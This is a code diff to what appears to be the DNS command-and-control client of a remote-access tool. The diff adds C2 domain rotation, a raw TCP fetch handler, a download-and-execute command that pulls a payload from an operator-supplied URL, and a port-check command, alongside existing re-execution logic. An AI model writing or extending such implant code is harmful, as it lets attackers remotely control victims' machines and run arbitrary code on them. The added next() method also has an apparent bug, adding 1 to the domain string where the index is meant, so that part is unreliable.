@@ -15,6 +15,7 @@ import zlib
 import tempfile
 import subprocess
 import logging
+import urllib
 import urllib2
 
 from ecpv import ECPV
@@ -22,12 +23,73 @@ from picocmd import *
 
 from threading import Thread
 
+class TCPFile(StringIO.StringIO):
+    pass
+
+class TCPReaderHandler(urllib2.BaseHandler):
+    def tcp_open(self, req):
+        addr = req.get_host().rsplit(':', 1)
+        host = addr[0]
+        if len(addr) == 1:
+            port = 53
+        else:
+            port = addr[1]
+
+        data = []
+        conn = socket.create_connection((host, port))
+        conn.settimeout(30)
+
+        try:
+            while True:
+                b = conn.recv(65535)
+                if not b:
+                    break
+
+                data.append(b)
+
+            if not data:
+                raise ValueError('No data')
+        except:
+            pass
+
+        data = b''.join(data)
+
+        fp = TCPFile(data)
+        if data:
+            headers = {
+                'Content-type': 'application/octet-stream',
+                'Content-length': len(data),
+            }
+            code = 200
+        else:
+            headers = {}
+            code = 404
+
+        return urllib.addinfourl(fp, headers, req.get_full_url(), code=code)
+
+urllib2.install_opener(
+    urllib2.build_opener(TCPReaderHandler())
+)
+
 class DnsCommandClientDecodingError(Exception):
     pass
 
+__DEBUG = 0
+
+if __DEBUG:
+    import dns.resolver
+    resolver = dns.resolver.Resolver()
+    resolver.nameservers = [ '127.0.0.1' ]
+    resolver.port = 5454
+    socket.gethostbyname_ex = lambda x: (None, None, [
+        str(rdata) for rdata in resolver.query(x, 'A')
+    ])
+
 class DnsCommandsClient(Thread):
     def __init__(self, domain, key):
-        self.domain = domain
+        self.domains = domain.split(',')
+        self.domain_id = 0
+        self.domain = self.domains[self.domain_id]
         self.translation = dict(zip(
             ''.join([
                 ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
@@ -48,6 +110,9 @@ class DnsCommandsClient(Thread):
 
         Thread.__init__(self)
 
+    def next(self):
+        self.domain_id = ( self.domain + 1 ) % len(self.domains)
+        self.domain = self.domains[self.domain_id]
 
     def _a_page_decoder(self, addresses, nonce, symmetric=None):
         if symmetric is None:
@@ -107,6 +172,7 @@ class DnsCommandsClient(Thread):
 
         except socket.error as e:
             logging.error('DNSCNC: Communication error: {}'.format(e))
+            self.next()
             return []
 
         response = None
@@ -157,10 +223,30 @@ class DnsCommandsClient(Thread):
             except Exception as e:
                 logging.exception(e)
 
+    def on_downloadexec(self, url, action, use_proxy):
+        if use_proxy:
+            opener = urllib2.build_opener(urllib2.ProxyHandler()).open
+        else:
+            opener = urllib2.urlopen
+
+        try:
+            response = opener(url)
+            if response.code == 200:
+                self.on_downloadexec_content(url, action, response.read())
+
+        except Exception as e:
+            logging.exception(e)
+
     def on_pastelink_content(self, url, action, content):
         pass
 
+    def on_downloadexec_content(self, url, action, content):
+        pass
+
     def on_connect(self, ip, port, transport):
+        pass
+
+    def on_checkconnect(self, host, port_start, port_end=None):
         pass
 
     def on_exit(self):
@@ -202,6 +288,8 @@ class DnsCommandsClient(Thread):
                         response))
             elif isinstance(command, PasteLink):
                 self.on_pastelink(command.url, command.action, self.encoder)
+            elif isinstance(command, DownloadExec):
+                self.on_downloadexec(command.url, command.action, command.proxy)
             elif isinstance(command, Connect):
                 self.on_connect(command.ip, command.port, transport=command.transport)
             elif isinstance(command, Error):
@@ -210,6 +298,8 @@ class DnsCommandsClient(Thread):
                 self.on_disconnect()
             elif isinstance(command, Sleep):
                 time.sleep(command.timeout)
+            elif isinstance(command, CheckConnect):
+                self.on_checkconnect(command.host, command.port_start, port_end=command.port_end)
             elif isinstance(command, Reexec):
                 executable = os.readlink('/proc/self/exe')
                 args = open('/proc/self/cmdline').read().split('\x00')
